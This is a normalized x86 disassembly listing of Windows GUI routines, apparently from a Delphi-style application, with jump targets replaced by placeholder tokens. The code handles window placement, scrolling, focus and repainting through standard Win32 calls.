call sub_43cbec
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_456c04
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_4034e4
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_4034e4
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_4034e4
test al al
jne r-xdata
sub_445c70
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_4475d8
mov edx esi
mov eax ebx
call sub_445bdc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_440e64
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_440e64
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_440e64
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_456c04
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_440e64
test eax eax
jne r-xdata
jmp r-xdata
sub_445d54
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_440e64
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_445da8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_440e64
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_456c04
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_440e64
test eax eax
jne r-xdata
sub_445df4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_445bdc
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_440e64
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_456c04
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_440e64
test eax eax
jne r-xdata
sub_445e50
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_456c04
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_440e64
mov [ esi + 0xc ] eax
sub_445e84
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43f304
mov eax ebx
mov si 0xffd0
call sub_4034e4
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43f650
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_445f5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_4431c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_44318c
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_4034e4
inc edi
dec ebx
jne r-xdata
sub_445fa4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_442d30
xor eax eax
push ebp
push sub_446042
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445f5c
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f8cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446049
mov eax [ ebp - 0x4 ]
call sub_442d38
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_446050
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_4431c8
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_442d58
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_44318c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_446140
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_4175cc
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_417460
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_4175ec
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_417570
call sub_4464d0
jmp r-xdata
mov eax ebp
mov edx esi
call sub_417570
call sub_4464d0
sub_446218
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_446140
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_446278
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4464d0
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4464d0
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
test eax eax
jne r-xdata
sub_446314
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4467d4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_440e64
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_433194
call sub_433274
test al al
je r-xdata
mov eax ebx
call sub_4431c8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_44318c
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_44318c
test [ eax + 0x52 ] 0x4
je r-xdata
sub_4463d8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43f650
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_446410
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_456c04
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_446450
push ebx
mov ebx eax
mov eax ebx
call sub_456c04
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45a970
pop ebx
retn
mov eax ebx
call sub_456c2c
mov eax ebx
call sub_4464d0
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_446488
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4464ac
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_4464ac
sub_4464e4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_41613c
mov eax edi
call sub_4431c8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_44318c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_446578
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4464d0
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4465b0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4467d4
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4464d0
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_4034e4
sub_44666c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_4175cc
pop esi
pop ebx
retn
sub_446690
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_44666c
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_417460
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_4175ec
sub_446704
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_4467d4
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_440e64
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_446764
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4467c8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4467cf
lea eax [ ebp - 0x4 ]
call sub_405928
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_4034e4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405940
sub_4467e0
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43f304
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_446898
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_417570
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_417414
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_4034e4
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_4468f8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4469ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_4034e4
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4469f5
mov eax [ ebp - 0x14 ]
call sub_4032e8
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4175cc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_417570
mov edi eax
mov eax edi
mov si 0xffb8
call sub_4034e4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_446a04
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_4468f8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_446a30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4431c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44318c
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_446a78
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_446140
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43ff20
sub_446ac0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_446b44
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4467d4
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_4431c8
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_446f06
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4431c8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_446ac0
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_44318c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
